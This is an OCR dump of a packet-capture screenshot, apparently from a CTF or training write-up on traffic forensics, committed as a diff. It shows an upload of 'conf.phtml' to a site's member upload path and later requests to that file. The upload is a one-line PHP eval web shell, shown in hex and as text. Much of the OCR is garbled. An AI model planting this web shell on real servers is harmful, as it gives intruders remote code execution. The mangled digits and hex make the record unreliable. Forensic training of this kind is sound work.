@@ -1,0 +1,177 @@
+# OCR: 70dbf89bfada535674bde7c3c33d7e23.webp
+# 来源: ./02-WriteUp/2025/2025-能力验证-培训/70dbf89bfada535674bde7c3c33d7e23.webp
+# 引擎: Umi-OCR 2.1.5 / PaddleOCR (config_chinese, limit_side_len=2880, multi_para)
+# 生成: 2026-11-03 15:35
+
+62392025-05-2616:17:42.819352Z 62572925-05-2616:17:59.799654Z 62592925-95-2616:17:59.7995297 62612925-95-2616:17:59.8934987 62632025-05-2616:17:50.812457Z 62712025-05-2616:17:54.432373Z 62732925-05-2616:17:54.440439Z 6281.2925-95-26.16:18:93.6214357 62872925-05-2616:18:93.692674Z 62992025-05-2616:18:96.3209917 63912925-95-2616:18:96.325822Z 63132025-05-2616:18:12.435107Z 63152925-05-2616:18:12.4612947 68992025-05-2616:1849.2562817 68642925-95-2616:18:49.611314Z
+192.168.0.177 19.211.88.7
+192.168.9.177 10.211.88.7 192.168.0.177 10.211.88.7 192.168.0.177 10.211.88.7 192.168.0.177 10.211.88.7 192.168.0.177 10.211.88.7 192.168.0.177 10.211.88.7 192.168.9.177
+10.211.88.7 192.168.0.177 10.211.88.7 192.168.0.177 10.211.88.7 192,168.9.177 10.211.88.7 192.168.0.177 10.211.88.7 192.168.0.177 19.211.88.7 192.168.0.177 10.211.88.7 192.168.0.177 10.211.88.7
+Frame6257:Packet,1o22bytesonwire（8176bits),1o22bytescaptured（8176bits）
+HTTP HTTP HTTP HTTP HTTP HTTP HTTP HTTP HTTP HTTP HTTP HTTP HTTP HTTP HTTP
+EthernetII,Src:Parallels6e:f7:4b(00:1c:42:6e:f7:4b),Dst:Parallels00:00:18(00:1c:42:00:00:18) InternetProtocolVersion4,Src:1e.211.88.7(10.211.88.7),Dst:192.168.0.177(192.168.0.177)
+Transmission Control Protocol, Src Port: 59924, Dst Port: 1oo01, Seq: 1,Ack: 1, Len: 968 Hypertext Transfer Protocol
+MIMEMultipart Media Encapsulation,Type:multipart/form-data,Boundary:"
+[Type:multipart/form-data]
+First boundary: -.
+--133619231818509134841106268900lrln
+Encapsulated multipart part:(application/octet-stream)
+Content-Disposition:form-data;name="upload";filename="conf.phtml"\rln
+Content-Type:application/octet-stream/r/nlrln Data(33 bytes)
+Data:3c3f706870206576616c28245f504f53545b226834636b3466756e225d293b3f3e[Length:33]
+Last boundary:Irin
+133619231818509134841106268900--lrln
+-133619231818599
+aPP(PNG)
+648HTTP/1.1299OK
+Javasciipty
+1922PosT/?member/upload/HTTP/1.1 550HTTP/1.12000K（text/html）
+560GET/static/upload/other/202207906/1657037870691680.phtmlHTTP/1.1 288HTTP/1.1200OK
+6o5GET/template/default/bootstrap/css/bootstrap.min.css.mapHTTP/1.1 245HTTP/1.1394NotModified
+615GET/?member/umodify/HTTP/1.1 581HTTP/1.12990K（text/html)
+6o5GET/template/default/bootstrap/css/bootstrap.min.css.mapHTTP/1.1 245HTTP/1.1304NotModified
+650GET/static/up1oad/other/20220706/1657037870691680.phtmlHTTP/1.1 288HTTP/1.1.299OK
+816P0sT/static/upload/other/20220706/1657037870691680.phtmlHTTP/1.1（app1ication/x-www-form-urlencoded） 196HTTP/1.120eOK（text/html)
+8270 8280 e290 02ae e2be 02c0 92de 02ee e2fe 9300 0310 8320 0330 9340 9350 9360 9370 9380 9390 93a e3be e3ce e3de 03e e3fe
+6d6b6e6c753837
+39393b 646333
+20 34
+386430
+62
+393336
+34
+48 31 31 34
+663666
+33
+37
+3835
+62
+35
+3d3136 2d2d
+2d
+2d
+2d2d
+2d
+31 39 32
+33
+3131 656e 2966
+36 2d
+3d 22 75
+79
+37 37 2d 2d 31 32 44 6d 6c
+6d 36 35 36 64 38 39 2d 2d 38 36 69 20 6f
+5f 63
+75 6c 61
+38
+30
+3b
+29
+6333
+64
+39
+37 33
+2d 2d
+2d 2d
+31
+38
+38 61
+616d653d
+22
+63
+6f
+odoa43
+6f6e
+74
+65
+39 79 61 64 6e 6e
+6170706c69
+6174
+63
+742d7374.7265
+616d
+70206576616c2824 34636b3466756e22
+2d 2d 2d 2d 2d
+2d
+2d 2d 2d
+2d 2d
+2d
+313932
+2d
+2d
+2d
+2d
+31
+38
+31
+38
+33
+3131303632363839
+32 76 35 33 48
+69 74 31 37
+39 5f 34 65
+15f 6d
+71 66 38
+70653538
+36 35
+3337 66
+6237 37
+31 36 35 37 3d
+6c
+70
+76745f
+34 31 36 63
+61353134
+62 37 2d 2d 35 39
+35 31
+38
+38
+333765 39
+od Oa od oa2d 32
+2d
+2d
+2d 39 39
+2d 39 d
+73 6f
+69
+7461
+3b
+223b
+29
+2d
+ 2d 2d 2d 2d
+2d 31 Oa
+31
+3336 33
+34 38 34 33
+43
+69 74
+20 66
+662e
+7068
+74 2d 54 79
+6e 69
+6f
+6e74
+6f6e3a
+61
+6d65
+656e 6c
+74
+6c22
+6d
+70
+3a20 65
+696f6e2f6f637465 od Oa od Oa
+3c3f7068
+5f504f53545b2268 5d293b3f3eodoa2d 2d2d2d2d2d
+2d 2d 2d
+2d 2d 2d 2d 31 33 33 36 35
+30393133343834 30302d2d0d0a
+mknlu87u2i9qpe58 00:Hm1vtf6f37 dc3416ca514857b7 8dob158037e=1657 036446:Hm1pvt f6f37dc3416ca514 857b78dob158037e =1657037
+782
+-1336
+1923181850913484 11062689 00.Cont ent-Disp osition: form-da ta: name-"upload "; filen ame="con f.phtml"..Conten t-Type: application/octe t-stream ....<?ph peval($_POST["h
+4ck4fun"
+);?>
+-1336
+1923181850913484 11062689 00--.
